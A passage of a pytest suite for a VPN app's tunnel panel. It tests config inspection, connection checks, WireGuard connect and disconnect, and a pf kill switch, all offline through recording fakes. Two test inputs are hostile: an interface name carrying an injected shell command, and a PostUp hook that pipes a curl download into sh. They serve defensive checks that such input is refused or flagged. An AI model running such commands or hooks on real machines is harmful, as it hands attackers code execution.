"""Phase 3 workflow contracts: Tunnel and Chat.

One contract per user workflow, each with the same five questions:

  1. positive        the happy path does what it says
  2. invalid input   a bad choice is refused with a reason, not a crash
  3. denied          answering No to a confirmation runs/spends/deletes nothing
  4. cancel / error  Stop, a failed command or a provider error leaves no half-state
  5. persist+restart what is stored survives a new panel / a new window

Everything is offline. An autouse guard makes ``socket.connect``,
``getaddrinfo``, ``subprocess.run`` and ``subprocess.Popen`` raise
AssertionError, so a real wg-quick / openvpn / pfctl / sudo / osascript /
route / networksetup call (or any network) fails the test instead of
happening. Privilege is injected as a recording fake, the pf service's
``_run_privileged`` is a recording fake, the audit log, VPN state dir, chat
history and report folder all live under tmp_path.

Helpers are copied from tests/test_vpn_execution.py, tests/test_ui_panels.py
(TestTunnelPanel) and tests/test_chat_lifecycle.py on purpose: no cross-test
imports. Existing coverage is not repeated; this file targets the gaps.
"""

from __future__ import annotations

import contextlib
import json
import os
import socket
import subprocess
import uuid
from types import SimpleNamespace

import pytest
from PySide6.QtCore import QEvent, QObject, Signal
from PySide6.QtWidgets import QApplication, QFileDialog, QInputDialog, QLabel, QMessageBox

from services import vpn_connection, vpn_execution
from services.database import get_connection

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


# ─────────────────────────────────────────────────────────────────────────────
# Offline guard
# ─────────────────────────────────────────────────────────────────────────────

class Guard:
    """Holds the real callables so a test can opt in, explicitly and briefly."""

    def __init__(self):
        self.real = {
            "connect": socket.socket.connect,
            "getaddrinfo": socket.getaddrinfo,
            "run": subprocess.run,
            "Popen": subprocess.Popen,
        }
        self.blocked = []

    @contextlib.contextmanager
    def open(self):
        """Opt in to the real calls (used only while a window or panel is
        constructed: the window's version label runs git, the IP readout
        reads ifconfig)."""
        saved = (socket.socket.connect, socket.getaddrinfo,
                 subprocess.run, subprocess.Popen)
        socket.socket.connect = self.real["connect"]
        socket.getaddrinfo = self.real["getaddrinfo"]
        subprocess.run = self.real["run"]
        subprocess.Popen = self.real["Popen"]
        try:
            yield
        finally:
            (socket.socket.connect, socket.getaddrinfo,
             subprocess.run, subprocess.Popen) = saved


@pytest.fixture(autouse=True)
def guard(monkeypatch):
    g = Guard()

    def blocked(what):
        def _raise(*args, **kwargs):
            g.blocked.append((what, args[:2]))
            raise AssertionError(f"offline guard: {what} {args[:2]!r} is not allowed here")
        return _raise

    monkeypatch.setattr(socket.socket, "connect", blocked("socket.connect"))
    monkeypatch.setattr(socket, "getaddrinfo", blocked("socket.getaddrinfo"))
    monkeypatch.setattr(subprocess, "run", blocked("subprocess.run"))
    monkeypatch.setattr(subprocess, "Popen", blocked("subprocess.Popen"))
    return g


@pytest.fixture(scope="module")
def qapp():
    return QApplication.instance() or QApplication([])


class Dialogs:
    """Records every modal box and answers question() as the test says."""

    def __init__(self):
        self.answer = QMessageBox.Yes
        self.questions, self.warnings, self.infos, self.criticals = [], [], [], []

    def install(self, monkeypatch):
        def question(parent, title, text, buttons=None, default=None):
            self.questions.append((title, text, default))
            return self.answer

        def record(bucket):
            return staticmethod(lambda parent, title, text, *a, **k: bucket.append((title, text)))

        monkeypatch.setattr(QMessageBox, "question", staticmethod(question))
        monkeypatch.setattr(QMessageBox, "warning", record(self.warnings))
        monkeypatch.setattr(QMessageBox, "information", record(self.infos))
        monkeypatch.setattr(QMessageBox, "critical", record(self.criticals))
        return self


@pytest.fixture
def dialogs(monkeypatch):
    return Dialogs().install(monkeypatch)


# ═════════════════════════════════════════════════════════════════════════════
# TUNNEL
# ═════════════════════════════════════════════════════════════════════════════

class Recorder:
    """The privileged runner: records every script, never runs one."""

    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    """Fake local state: which interfaces are up, OpenVPN, and the public route."""

    def __init__(self, up=(), device="utun7", route=None, openvpn=False):
        self.up = set(up)
        self.openvpn = openvpn
        self.route = route
        super().__init__(
            wireguard=lambda name: ({"up": True, "device": device}
                                    if name in self.up else {"up": False, "device": None}),
            openvpn_running=lambda: self.openvpn,
            route_interface=lambda: self.route,
        )


def write_conf(tmp_path, name="wgnl", allowed="0.0.0.0/0, ::/0", dns="10.8.0.1",
               extra_interface=""):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\n"
        "Address = 10.8.0.2/32\n"
        + (f"DNS = {dns}\n" if dns else "")
        + extra_interface
        + "\n[Peer]\n"
        "PublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        f"PresharedKey = {PRIVATE_KEY}\n"
        "Endpoint = 203.0.113.7:51820\n"
        f"AllowedIPs = {allowed}\n",
        encoding="utf-8",
    )
    os.chmod(path, 0o600)
    return path


def view_text(view) -> str:
    """Everything a SectionView shows: every card label plus the raw reply."""
    return "\n".join([label.text() for label in view.findChildren(QLabel)] + [view._raw])


class FakeHost:
    """The surface a panel may touch."""

    def __init__(self):
        self.agent_instances = {"vpn": SimpleNamespace(build_messages=lambda p: [])}
        self.agent_factory = SimpleNamespace()
        self.calls = []

    def load_models_into(self, provider_box, model_box, context, empty_placeholder=False):
        model_box.clear()
        model_box.addItems(["m1"])

    def register_model_loader(self, agent_key, loader):
        pass

    def authorize_request(self, *a, **k):
        self.calls.append(("authorize",))
        return False

    def record_request(self, *a, **k):
        self.calls.append(("record",))

    def abandon_request(self, *a, **k):
        self.calls.append(("abandon",))

    def note_request_usage(self, *a, **k):
        pass

    def run_backend(self, *a, **k):
        self.calls.append(("run_backend",))
        return ""

    def _note_failure(self, *a, **k):
        self.calls.append(("failure", a[:1]))

    def show_agent_docs(self):
        pass


class Gate:
    """Everything Connect/Disconnect/Kill switch may touch, injected."""

    def __init__(self, tmp_path):
        self.audit_path = tmp_path / "audit" / "tunnel_audit.jsonl"
        self.run = Recorder()
        self.probe = Probe(route="utun7")
        self.armed = False
        self.bring_up = None            # interface the fake wg-quick brings up/down
        self.sleeps = []
        self.workers = []

    def runner(self, script, prompt, timeout=30):
        ok, output = self.run(script, prompt, timeout)
        if ok and self.bring_up:
            if " up " in script:
                self.probe.up.add(self.bring_up)
            elif " down " in script:
                self.probe.up.discard(self.bring_up)
        return ok, output

    def entries(self):
        if not self.audit_path.exists():
            return []
        return [json.loads(line) for line in self.audit_path.read_text().splitlines()]


@pytest.fixture
def state_dir(tmp_path, monkeypatch):
    path = tmp_path / "vpn-state"
    monkeypatch.setenv("VPN_AGENT_STATE_DIR", str(path))
    return path


@pytest.fixture
def gate(tmp_path, monkeypatch, state_dir):
    from agents.vpn_agent.services import privileged

    g = Gate(tmp_path)
    monkeypatch.setattr(vpn_execution, "default_audit_path", lambda: g.audit_path)
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: None if name == "wg-quick" else real_which(name, *a, **k))
    monkeypatch.setattr(vpn_execution, "_killswitch_armed", lambda: g.armed)
    monkeypatch.setattr(vpn_execution, "_default_probe", lambda: g.probe)
    # Any privileged call that bypasses the injected runner is a test failure.
    monkeypatch.setattr(privileged, "run_as_root",
                        lambda *a, **k: pytest.fail("a real privileged call was attempted"))

    real_execute = vpn_execution.execute

    def execute(action, profile, **kwargs):
        g.workers.append(action)
        kwargs.setdefault("run_as_root", g.runner)
        kwargs.setdefault("sleep", g.sleeps.append)
        return real_execute(action, profile, **kwargs)

    monkeypatch.setattr(vpn_execution, "execute", execute)
    return g


def _sync_worker_class(base):
    """The real worker, run on the calling thread so the test can read the result."""
    class Sync(base):
        def start(self):
            self.run()

        def isRunning(self):          # noqa: N802 - Qt name
            return False
    return Sync


@pytest.fixture
def tunnel(qapp, monkeypatch, gate, guard):
    import ui.panels.vpn as vpn_mod
    from services.vpn_diagnostics import VpnProfileCatalog
    from ui.panels.vpn import VpnPanel
    from ui.workers import VpnConnectionWorker

    monkeypatch.setattr(vpn_mod, "load_vpn_profile_catalog",
                        lambda: VpnProfileCatalog(profiles=(), active_profile="", source="test"))
    monkeypatch.setattr(VpnPanel, "connection_worker_class", _sync_worker_class(VpnConnectionWorker))

    def make():
        with guard.open():                       # construction reads ifconfig
            return VpnPanel(FakeHost())
    base = set(QApplication.topLevelWidgets())
    panel = make()
    panel.make_another = make                     # a "restart": a brand-new panel
    yield panel
    for widget in set(QApplication.topLevelWidgets()) - base:
        widget.deleteLater()
    QApplication.sendPostedEvents(None, QEvent.DeferredDelete)


def pick(panel, profile):
    panel.connect_profile_box.clear()
    panel.connect_profile_box.addItem(profile["name"], profile)


def wg_profile(path, name=None):
    profile = vpn_connection.profile_from_config(str(path))
    if name:
        profile["name"] = name
    return profile


# ── 1. Inspect config ───────────────────────────────────────────────────────

class TestInspectConfig:
    def choose(self, monkeypatch, path):
        monkeypatch.setattr(QFileDialog, "getOpenFileName",
                            staticmethod(lambda *a, **k: (str(path), "")))

    def test_positive_shows_routing_intent_and_discards_every_key(
            self, tunnel, monkeypatch, tmp_path, gate):
        self.choose(monkeypatch, write_conf(tmp_path))
        tunnel.inspect_config()
        shown = view_text(tunnel.config_inspection_view)
        assert "Full tunnel" in shown or "0.0.0.0/0" in shown
        assert PRIVATE_KEY not in shown
        assert "key material discarded" in tunnel.status_label.text()
        assert tunnel.tabs.currentWidget() is tunnel.config_inspection_view
        assert gate.run.scripts == [] and gate.workers == []     # read-only: nothing executed

    @pytest.mark.parametrize("make", [
        lambda p: p / "does-not-exist.conf",
        lambda p: p,                                     # a directory, not a file
    ])
    def test_invalid_path_is_refused_with_a_reason_and_the_view_is_unchanged(
            self, tunnel, monkeypatch, tmp_path, dialogs, make):
        self.choose(monkeypatch, make(tmp_path))
        before = view_text(tunnel.config_inspection_view)
        tunnel.inspect_config()
        (title, text), = dialogs.warnings
        assert "Could Not Be Inspected" in title and "not a readable file" in text
        assert view_text(tunnel.config_inspection_view) == before
        assert "inspected locally" not in tunnel.status_label.text()

    def test_invalid_oversized_and_binary_files_are_refused(
            self, tunnel, monkeypatch, tmp_path, dialogs):
        big = tmp_path / "big.conf"
        big.write_text("#" * (1024 * 1024 + 10))
        binary = tmp_path / "bin.conf"
        binary.write_bytes(b"\xff\xfe\x00\x80" * 50)
        for path in (big, binary):
            self.choose(monkeypatch, path)
            tunnel.inspect_config()
        assert len(dialogs.warnings) == 2
        assert "1 MiB" in dialogs.warnings[0][1]
        assert "UTF-8" in dialogs.warnings[1][1]

    def test_denied_cancelling_the_file_dialog_reads_nothing(self, tunnel, monkeypatch, gate, dialogs):
        monkeypatch.setattr(QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: ("", "")))
        tunnel.inspect_config()
        assert dialogs.warnings == [] and gate.run.scripts == []
        assert "No results yet" in view_text(tunnel.config_inspection_view)

    def test_error_a_failed_inspection_does_not_wipe_the_previous_result(
            self, tunnel, monkeypatch, tmp_path, dialogs):
        good = write_conf(tmp_path, "good")
        self.choose(monkeypatch, good)
        tunnel.inspect_config()
        first = view_text(tunnel.config_inspection_view)
        self.choose(monkeypatch, tmp_path / "gone.conf")
        tunnel.inspect_config()
        assert dialogs.warnings
        assert view_text(tunnel.config_inspection_view) == first

    def test_persist_nothing_is_stored_and_a_restart_starts_empty_and_repeatable(
            self, tunnel, monkeypatch, tmp_path, state_dir):
        conf = write_conf(tmp_path)
        self.choose(monkeypatch, conf)
        tunnel.inspect_config()
        first = view_text(tunnel.config_inspection_view)
        for path in list(tmp_path.rglob("*")) + ([state_dir] if state_dir.exists() else []):
            if path.is_file() and path != conf:
                assert PRIVATE_KEY not in path.read_text(errors="ignore"), path
        again = tunnel.make_another()
        assert "No results yet" in view_text(again.config_inspection_view)
        self.choose(monkeypatch, conf)
        again.inspect_config()
        assert view_text(again.config_inspection_view) == first


# ── 2. Connection Check ─────────────────────────────────────────────────────

def _completed(stdout="", returncode=0):
    return SimpleNamespace(stdout=stdout, stderr="", returncode=returncode)


@pytest.fixture
def local_machine(monkeypatch):
    """A fake Mac for the read-only check. Records every command it is asked to run."""
    from services import vpn_diagnostics as diagnostics

    commands, contacted = [], []
    monkeypatch.setattr(diagnostics.Path, "exists", lambda _self: True)
    monkeypatch.setattr(diagnostics.shutil, "which",
                        lambda name: f"/usr/local/bin/{name}" if name in {"route", "openvpn", "pgrep"} else None)
    monkeypatch.setattr(diagnostics.wireguard_manager, "is_wg_available", lambda: True)
    monkeypatch.setattr(diagnostics.wireguard_manager, "is_wg_quick_available", lambda: True)
    monkeypatch.setattr(diagnostics.wireguard_manager, "list_active_tunnels", lambda: ["utun7"])
    monkeypatch.setattr(diagnostics.dns_check, "get_system_dns_servers", lambda: ["10.0.0.53"])
    monkeypatch.setattr(diagnostics.public_ip, "get_public_ip",
                        lambda: contacted.append("ip") or "203.0.113.10")
    monkeypatch.setattr(diagnostics.latency, "measure_latency",
                        lambda: contacted.append("latency") or {"latency_ms": 20.0, "method": "icmp", "status": "OK"})

    def fake_run(command, timeout=8):
        commands.append(list(command))
        if command[-3:] == ["-n", "get", "default"]:
            return _completed("gateway: 10.0.0.1\ninterface: utun7\n")
        if command[-2:] == ["show", "interfaces"]:
            return _completed("utun7\n")
        if command[-1] == "latest-handshakes":
            return _completed("peer-one\t1700000000\n")
        if command[-1] == "transfer":
            return _completed("peer-one\t2048\t4096\n")
        if command[-2:] == ["-x", "openvpn"]:
            return _completed(returncode=1)
        raise AssertionError(f"unexpected command: {command}")

    monkeypatch.setattr(diagnostics, "_run", fake_run)
    return SimpleNamespace(commands=commands, contacted=contacted)


class ScriptedDiagnosticsWorker(QObject):
    """A diagnostics worker the test finishes by hand (copy of the ui_panels fake)."""

    finished_signal = Signal(object)
    error_signal = Signal(str)
    instances = []

    def __init__(self, include_external=False, selected_profile=None):
        super().__init__()
        self.include_external, self.selected_profile = include_external, selected_profile
        self.running, self.cancelled = True, False
        ScriptedDiagnosticsWorker.instances.append(self)

    def start(self):
        pass

    def isRunning(self):          # noqa: N802
        return self.running

    def cancel(self):
        self.cancelled = True


class TestConnectionCheck:
    @pytest.fixture
    def real_worker(self, monkeypatch):
        from ui.panels.vpn import VpnPanel
        from ui.workers import VpnDiagnosticsWorker
        monkeypatch.setattr(VpnPanel, "diagnostics_worker_class",
                            _sync_worker_class(VpnDiagnosticsWorker))

    @pytest.fixture
    def scripted(self, monkeypatch):
        from ui.panels.vpn import VpnPanel
        ScriptedDiagnosticsWorker.instances.clear()
        monkeypatch.setattr(VpnPanel, "diagnostics_worker_class", ScriptedDiagnosticsWorker)
        return ScriptedDiagnosticsWorker

    def test_positive_local_check_reports_the_tunnel_and_contacts_nothing(
            self, tunnel, real_worker, local_machine, gate):
        tunnel.run_diagnostics()
        shown = view_text(tunnel.diagnostics_view)
        assert "utun7" in shown
        assert tunnel.status_label.text() == "Connection check complete."
        assert tunnel.diagnostics_btn.isEnabled() and not tunnel.diagnostics_stop_btn.isEnabled()
        assert local_machine.contacted == []
        assert gate.run.scripts == []

    def test_invalid_a_hostile_interface_name_is_never_put_in_a_command(
            self, tunnel, real_worker, local_machine, monkeypatch):
        tunnel.profile_box.clear()
        tunnel.profile_box.addItem("Evil", {"name": "Evil", "endpoint": "vpn.example.test",
                                            "port": 51820, "interface": "wg0; touch /tmp/pwned"})
        tunnel.run_diagnostics()
        assert tunnel.status_label.text() == "Connection check complete."
        assert not any("pwned" in " ".join(c) for c in local_machine.commands)

    def test_denied_external_checks_default_to_no_and_start_no_worker(
            self, tunnel, scripted, local_machine, dialogs):
        dialogs.answer = QMessageBox.No
        tunnel.external_checks_box.setChecked(True)
        tunnel.run_diagnostics()
        (title, text, default), = dialogs.questions
        assert "api.ipify.org" in text and default == QMessageBox.No
        assert scripted.instances == [] and local_machine.contacted == []
        assert tunnel.diagnostics_btn.isEnabled()

    def test_accepted_external_checks_contact_ip_and_latency_exactly_once(
            self, tunnel, real_worker, local_machine, dialogs):
        tunnel.external_checks_box.setChecked(True)
        tunnel.run_diagnostics()
        assert local_machine.contacted == ["ip", "latency"]
        assert "203.0.113.10" in view_text(tunnel.diagnostics_view)

    def test_cancel_stop_asks_the_worker_and_the_stopped_report_is_labelled(
            self, tunnel, scripted, local_machine):
        from services import vpn_diagnostics as diagnostics

        tunnel.run_diagnostics()
        worker = scripted.instances[-1]
        assert tunnel.diagnostics_stop_btn.isEnabled()
        tunnel.stop_diagnostics()
        assert worker.cancelled and "Stopping" in tunnel.status_label.text()
        assert tunnel.diagnostics_stop_btn.isEnabled() is False
        worker.running = False
        report = diagnostics.collect_vpn_diagnostics(should_cancel=lambda: True)
        worker.finished_signal.emit(report)
        assert tunnel.status_label.text() == "Connection check stopped."
        assert tunnel.diagnostics_btn.isEnabled()

    def test_error_a_failed_check_is_shown_and_the_button_comes_back(
            self, tunnel, scripted, local_machine):
        tunnel.run_diagnostics()
        scripted.instances[-1].error_signal.emit("route lookup exploded")
        assert tunnel.status_label.text() == "Connection check error."
        assert "route lookup exploded" in view_text(tunnel.diagnostics_view)
        assert tunnel.diagnostics_btn.isEnabled()

    def test_a_second_click_while_running_starts_no_second_check(
            self, tunnel, scripted, local_machine):
        tunnel.run_diagnostics()
        tunnel.run_diagnostics()
        assert len(scripted.instances) == 1

    def test_persist_nothing_is_stored_and_a_restarted_panel_checks_the_same_way(
            self, tunnel, real_worker, local_machine):
        tunnel.run_diagnostics()
        first = view_text(tunnel.diagnostics_view)
        again = tunnel.make_another()
        assert again._last_diagnostics_report is None
        assert "No results yet" in view_text(again.diagnostics_view)
        again.run_diagnostics()
        second = view_text(again.diagnostics_view)
        assert "utun7" in first and "utun7" in second
        assert first.count("10.0.0.53") == second.count("10.0.0.53")


# ── 3. Connect / Disconnect review dialog ───────────────────────────────────

class TestConnectDisconnect:
    def test_positive_yes_runs_exactly_one_wg_quick_up_and_verifies_and_audits(
            self, tunnel, gate, dialogs, tmp_path):
        conf = write_conf(tmp_path)
        gate.bring_up = "wgnl"
        pick(tunnel, wg_profile(conf, "NL"))
        tunnel.connect_vpn()
        (title, text, default), = dialogs.questions
        assert title == "Connect VPN" and default == QMessageBox.No
        assert PRIVATE_KEY not in text
        assert len(gate.run.scripts) == 1 and gate.run.scripts[0].endswith(f"up '{conf}'")
        assert "verified locally" in tunnel.connection_status_label.text()
        assert tunnel.connect_btn.isEnabled() and tunnel.disconnect_btn.isEnabled()
        (entry,) = gate.entries()
        assert entry["outcome"] == "succeeded" and entry["verified"] is True
        assert PRIVATE_KEY not in gate.audit_path.read_text()

    def test_positive_disconnect_runs_exactly_one_wg_quick_down(self, tunnel, gate, dialogs, tmp_path):
        conf = write_conf(tmp_path)
        gate.bring_up = "wgnl"
        gate.probe.up.add("wgnl")
        pick(tunnel, wg_profile(conf, "NL"))
        tunnel.disconnect_vpn()
        assert len(gate.run.scripts) == 1 and " down " in gate.run.scripts[0]
        assert "wgnl" not in gate.probe.up
        assert [e["action"] for e in gate.entries()] == ["disconnect"]

    def test_invalid_interface_name_is_blocked_before_any_prompt(
            self, tunnel, gate, dialogs, tmp_path):
        conf = write_conf(tmp_path, "bad name!")
        pick(tunnel, wg_profile(conf, "Bad"))
        tunnel.connect_vpn()
        assert dialogs.questions == [] and gate.run.scripts == [] and gate.workers == []
        (title, text), = dialogs.warnings
        assert "not a valid WireGuard interface name" in text and "Nothing was executed" in text
        (entry,) = gate.entries()
        assert entry["outcome"] == "refused" and entry["blockers"]

    def test_invalid_connecting_an_interface_that_is_already_up_is_refused(
            self, tunnel, gate, dialogs, tmp_path):
        conf = write_conf(tmp_path)
        gate.probe.up.add("wgnl")
        pick(tunnel, wg_profile(conf, "NL"))
        tunnel.connect_vpn()
        assert dialogs.questions == [] and gate.run.scripts == []
        assert tunnel.connection_status_label.text().startswith("Refused")

    def test_invalid_a_missing_config_file_and_no_selection_run_nothing(
            self, tunnel, gate, dialogs, tmp_path):
        tunnel.connect_profile_box.clear()
        tunnel.connect_vpn()
        tunnel.disconnect_vpn()
        assert len(dialogs.infos) == 2 and gate.run.scripts == []
        pick(tunnel, wg_profile(write_conf(tmp_path, "gone"), "Gone"))
        (tmp_path / "gone.conf").unlink()
        tunnel.connect_vpn()
        assert gate.run.scripts == [] and gate.workers == []
        assert "no longer exists" in dialogs.warnings[-1][1]

    @pytest.mark.parametrize("which", ["connect", "disconnect"])
    def test_denied_no_means_zero_privileged_calls_and_a_declined_audit_entry(
            self, tunnel, gate, dialogs, tmp_path, which):
        dialogs.answer = QMessageBox.No
        pick(tunnel, wg_profile(write_conf(tmp_path), "NL"))
        getattr(tunnel, f"{which}_vpn")()
        assert gate.run.scripts == [] and gate.workers == []
        (entry,) = gate.entries()
        assert (entry["action"], entry["outcome"]) == (which, "declined")
        assert tunnel.connection_status_label.text() == "Not run: confirmation declined."
        assert tunnel.connect_btn.isEnabled() and tunnel.disconnect_btn.isEnabled()

    def test_denied_root_hooks_get_their_own_prompt_and_declining_it_runs_nothing(
            self, tunnel, gate, dialogs, tmp_path, monkeypatch):
        conf = write_conf(tmp_path, "wgh", extra_interface="PostUp = curl -s http://203.0.113.9/x | sh\n")
        warned = []
        monkeypatch.setattr(QMessageBox, "warning",
                            staticmethod(lambda *a, **k: warned.append(a[2]) or QMessageBox.No))
        pick(tunnel, wg_profile(conf, "Hooked"))
        tunnel.connect_vpn()
        assert len(dialogs.questions) == 1 and len(warned) == 1
        assert "curl" in warned[0] and "administrator" in warned[0]
        assert gate.run.scripts == [] and gate.workers == []
        assert gate.entries()[-1]["outcome"] == "declined"

    def test_cancel_the_authorisation_dialog_is_a_failed_unverified_attempt(
            self, tunnel, gate, dialogs, tmp_path):
        gate.run.ok, gate.run.output = False, "Cancelled."
        pick(tunnel, wg_profile(write_conf(tmp_path), "NL"))
        tunnel.connect_vpn()
        assert len(gate.run.scripts) == 1
        assert tunnel.connection_status_label.text().startswith("Failed: Cancelled.")
        assert tunnel.connect_btn.isEnabled() and tunnel.disconnect_btn.isEnabled()
        assert gate.entries()[-1]["outcome"] == "failed"

    def test_error_an_exception_in_the_worker_re_enables_the_buttons(
            self, tunnel, gate, dialogs, tmp_path, monkeypatch):
        def boom(action, profile, **kw):
            raise RuntimeError("authorisation service unavailable")
        monkeypatch.setattr(vpn_execution, "execute", boom)
        pick(tunnel, wg_profile(write_conf(tmp_path), "NL"))
        tunnel.connect_vpn()
        assert "authorisation service unavailable" in tunnel.connection_status_label.text()
        assert tunnel.connect_btn.isEnabled() and tunnel.disconnect_btn.isEnabled()

    def test_error_a_cancelled_worker_drops_its_result_instead_of_updating_a_dead_panel(
            self, tunnel, gate, tmp_path):
        from ui.workers import VpnConnectionWorker
        got = []
        worker = VpnConnectionWorker("connect", wg_profile(write_conf(tmp_path), "NL"))
        worker.finished_signal.connect(got.append)
        worker.error_signal.connect(got.append)
        worker.cancel()
        worker.run()
        assert got == []

    def test_a_busy_connection_blocks_a_second_action(self, tunnel, gate, dialogs, tmp_path):
        class Busy:
            def isRunning(self):          # noqa: N802
                return True
        tunnel._connection_worker = Busy()
        pick(tunnel, wg_profile(write_conf(tmp_path), "NL"))
        tunnel.connect_vpn()
        tunnel.disconnect_vpn()
        assert dialogs.questions == [] and gate.run.scripts == []
        assert len(dialogs.infos) == 2

    def test_persist_profiles_and_audit_survive_a_restart_and_the_tunnel_state_is_re_read(
            self, tunnel, gate, dialogs, tmp_path, monkeypatch):
        conf = write_conf(tmp_path)
        gate.bring_up = "wgnl"
        monkeypatch.setattr(QFileDialog, "getOpenFileName",
                            staticmethod(lambda *a, **k: (str(conf), "")))
        tunnel.import_vpn_config()
        assert tunnel.selected_connect_profile()["config_path"] == str(conf)
        tunnel.connect_vpn()
        assert len(gate.run.scripts) == 1
        # restart: a new panel finds the imported profile in the state dir...
        again = tunnel.make_another()
        again.reload_connect_profiles()
        index = again.connect_profile_box.findText("Imported — wgnl")
        assert index >= 0
        again.connect_profile_box.setCurrentIndex(index)
        # ...the audit log is still there, and the interface being up (read
        # fresh from the machine, not remembered) now refuses a second connect.
        assert [e["outcome"] for e in gate.entries()] == ["succeeded"]
        again.connect_vpn()
        assert len(gate.run.scripts) == 1
        assert again.connection_status_label.text().startswith("Refused")
        assert gate.entries()[-1]["outcome"] == "refused"


# ── 4. Kill switch arm / disarm ─────────────────────────────────────────────

REAL_KILLSWITCH_ARMED = vpn_execution._killswitch_armed


@pytest.fixture
def pf(monkeypatch, state_dir, gate):
    """The real pf service with only its privileged hop, its rule validator and
    its interface discovery replaced. State (the armed marker) lives in the
    tmp state dir."""
    from agents.vpn_agent.services import killswitch

    pf = SimpleNamespace(ks=killswitch, scripts=[], result=(True, "ok"))

    def run_privileged(script, why):
        pf.scripts.append(script)
        return pf.result

    monkeypatch.setattr(killswitch, "is_supported", lambda: True)
    monkeypatch.setattr(killswitch, "_is_registered", lambda: True)
    monkeypatch.setattr(killswitch, "validate", lambda path=None: (True, ""))
    monkeypatch.setattr(killswitch, "active_tunnel_interfaces", lambda: ["utun7"])
    monkeypatch.setattr(killswitch, "_run_privileged", run_privileged)
    monkeypatch.setattr(vpn_execution, "_killswitch_armed", REAL_KILLSWITCH_ARMED)
    return pf


VPS = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7",
       "interface": "wg0", "port": 51820}


class TestKillSwitch:
    def test_positive_arm_loads_the_anchor_with_the_tunnel_exemption_and_marks_it_armed(
            self, tunnel, pf, dialogs, gate):
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        (title, text, default), = dialogs.questions
        assert title == "Arm kill switch" and default == QMessageBox.No
        assert "UDP/51820" in text and "203.0.113.7" in text and "pfctl" in text   # recovery command shown
        (script,) = pf.scripts
        assert "pfctl -E" in script and "-f" in script
        rules = pf.ks.rules_path().read_text()
        assert "pass out quick inet proto udp from any to 203.0.113.7 port 51820" in rules
        assert pf.ks.status().armed is True
        assert "ARMED" in tunnel.kill_switch_status_label.text()
        assert tunnel.arm_ks_btn.isEnabled() and tunnel.disarm_ks_btn.isEnabled()
        assert gate.entries()[-1]["action"] == "killswitch-arm"
        assert gate.entries()[-1]["outcome"] == "succeeded"

    def test_positive_disarm_flushes_only_the_anchor_and_clears_the_marker(
            self, tunnel, pf, dialogs, gate):
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        tunnel.disarm_kill_switch()
        assert len(pf.scripts) == 2
        assert pf.scripts[1].startswith("pfctl -a ") and "-F rules" in pf.scripts[1]
        assert "disarmed" in tunnel.kill_switch_status_label.text().lower()
        assert pf.ks.status().armed is False
        assert [e["action"] for e in gate.entries()] == ["killswitch-arm", "killswitch-disarm"]

    def test_invalid_template_profile_and_missing_profile_never_reach_pf(
            self, tunnel, pf, dialogs):
        tunnel.connect_profile_box.clear()
        tunnel.arm_kill_switch()
        pick(tunnel, {"name": "Example", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                      "interface": "wgjp", "placeholder": True})
        tunnel.arm_kill_switch()
        assert len(dialogs.infos) == 2 and dialogs.questions == []
        assert pf.scripts == [] and not pf.ks.rules_path().exists()

    def test_invalid_unresolvable_endpoint_is_not_armed(self, tunnel, pf, dialogs, monkeypatch):
        def nxdomain(*a, **k):
            raise socket.gaierror(8, "nodename nor servname provided")
        monkeypatch.setattr(pf.ks.socket, "getaddrinfo", nxdomain)
        pick(tunnel, dict(VPS, endpoint="vpn.invalid.example"))
        tunnel.arm_kill_switch()
        assert pf.scripts == []
        assert "Could not resolve" in tunnel.kill_switch_status_label.text()
        assert pf.ks.status().armed is False

    def test_invalid_platform_without_pf_is_explained_and_nothing_is_asked(
            self, tunnel, pf, dialogs, monkeypatch):
        monkeypatch.setattr(pf.ks, "is_supported", lambda: False)
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        assert dialogs.questions == [] and pf.scripts == []
        assert "needs macOS pf" in dialogs.infos[-1][1]

    def test_denied_no_arms_nothing_and_is_audited_as_declined(self, tunnel, pf, dialogs, gate):
        dialogs.answer = QMessageBox.No
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        assert pf.scripts == [] and gate.workers == []
        assert not pf.ks.rules_path().exists() and pf.ks.status().armed is False
        (entry,) = gate.entries()
        assert (entry["action"], entry["outcome"]) == ("killswitch-arm", "declined")
        assert "declined" in tunnel.kill_switch_status_label.text()

    def test_cancel_a_cancelled_authorisation_leaves_it_disarmed_and_names_the_recovery(
            self, tunnel, pf, dialogs, gate):
        pf.result = (False, "Cancelled.")
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        assert len(pf.scripts) == 1
        label = tunnel.kill_switch_status_label.text()
        assert "failed" in label.lower() and "Cancelled." in label
        assert pf.ks.status().armed is False
        assert gate.entries()[-1]["outcome"] == "failed"
        assert tunnel.arm_ks_btn.isEnabled() and tunnel.disarm_ks_btn.isEnabled()

    def test_error_a_worker_exception_re_enables_both_buttons(self, tunnel, pf, dialogs, monkeypatch):
        monkeypatch.setattr(vpn_connection, "arm_killswitch",
                            lambda profile: (_ for _ in ()).throw(RuntimeError("pf exploded")))
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        assert "pf exploded" in tunnel.kill_switch_status_label.text()
        assert tunnel.arm_ks_btn.isEnabled() and tunnel.disarm_ks_btn.isEnabled()

    def test_persist_armed_state_survives_a_restart_and_disconnect_then_warns(
            self, tunnel, pf, dialogs, gate, tmp_path):
        pick(tunnel, VPS)
        tunnel.arm_kill_switch()
        assert pf.ks.status().armed is True
        again = tunnel.make_another()             # restart: nothing held in memory
        conf = write_conf(tmp_path)
        pick(again, wg_profile(conf, "NL"))
        review = vpn_execution.review_execution("disconnect", wg_profile(conf, "NL"), probe=gate.probe)
